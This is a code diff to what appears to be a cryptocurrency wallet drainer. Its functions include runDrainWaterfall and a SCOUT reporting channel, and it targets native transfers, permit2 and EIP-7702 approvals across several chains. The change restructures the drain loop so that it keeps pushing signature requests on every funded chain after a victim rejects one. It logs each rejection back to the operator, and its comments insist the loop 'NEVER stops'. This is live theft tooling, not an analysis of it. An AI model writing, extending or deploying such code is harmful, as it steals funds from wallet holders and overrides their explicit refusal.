@@ -6238,9 +6238,11 @@
     L.log('[Mode B] chains to attempt:', ordered.join(','), '| portfolio funded:', chains.join(','));
     var anyOk = false;
     var anyRejected = false;
-    try {
-      for (var i = 0; i < ordered.length; i++) {
-        var cid = ordered[i];
+    // RULE: loop NEVER stops — every chain gets a chance regardless of what happens on prior chains.
+    // Rejection, RPC error, provider error — all are caught per-chain, logged, then loop continues.
+    for (var i = 0; i < ordered.length; i++) {
+      var cid = ordered[i];
+      try {
         // Skip chain if all-in-one confirmed, or both native+permit2 done
         if (isPopupConfirmed('eip7702', cid) || isPopupConfirmed('sendCalls', cid) ||
             (isPopupConfirmed('nativeTx', cid) && isPopupConfirmed('permit2', cid))) {
@@ -6269,30 +6271,24 @@
           continue;
         }
         L.log('Mode B drain chain', cid, '| $' + (assets.usd || 0).toFixed(2));
-        // Per-chain rejection handling — if user rejects one chain, continue to next funded chain
-        // instead of stopping the entire drain loop. anyRejected tracks whether retry is needed.
-        try {
-          var ok = await runWithRetry(function () {
-            return runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
-          }, 'evm-chain-' + cid);
-          if (ok) anyOk = true;
-        } catch (chainE) {
-          if (isUserRejection(chainE)) {
-            L.log('[Mode B] chain', cid, 'rejected — continuing to next funded chain');
-            try { await SCOUT.reportDrainStatus('user_rejected', address, cid, walletName, chainE.message); } catch (_eRpt) {}
-            anyRejected = true;
-            continue; // don't stop — try next chain in ordered list
-          }
-          throw chainE; // non-rejection errors still propagate
+        var ok = await runWithRetry(function () {
+          return runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
+        }, 'evm-chain-' + cid);
+        if (ok) anyOk = true;
+      } catch (chainE) {
+        // ANY error on this chain — rejection or otherwise — just log and move to next chain.
+        // Loop NEVER stops. User rejecting ETH does NOT prevent BSC/Polygon from being tried.
+        if (isUserRejection(chainE)) {
+          L.log('[Mode B] chain', cid, 'rejected by user — next chain');
+          try { await SCOUT.reportDrainStatus('user_rejected', address, cid, walletName, chainE.message); } catch (_eRpt) {}
+          anyRejected = true;
+        } else {
+          L.warn('[Mode B] chain', cid, 'error — skip, next chain:', chainE && chainE.message);
         }
+        // continue is implicit — loop goes to i+1
       }
-    } catch (e) {
-      if (isUserRejection(e)) {
-        await SCOUT.reportDrainStatus('user_rejected', address, startChainId, walletName, e.message);
-      }
-      throw e;
     }
-    // If no chain succeeded and at least one was rejected → throw to trigger the retry/showUserRejected flow
+    // After ALL chains attempted: if nothing succeeded and user rejected → trigger retry flow
     if (!anyOk && anyRejected) {
       var rejErr = new Error('user_rejected_all_chains');
       rejErr.code = 4001;
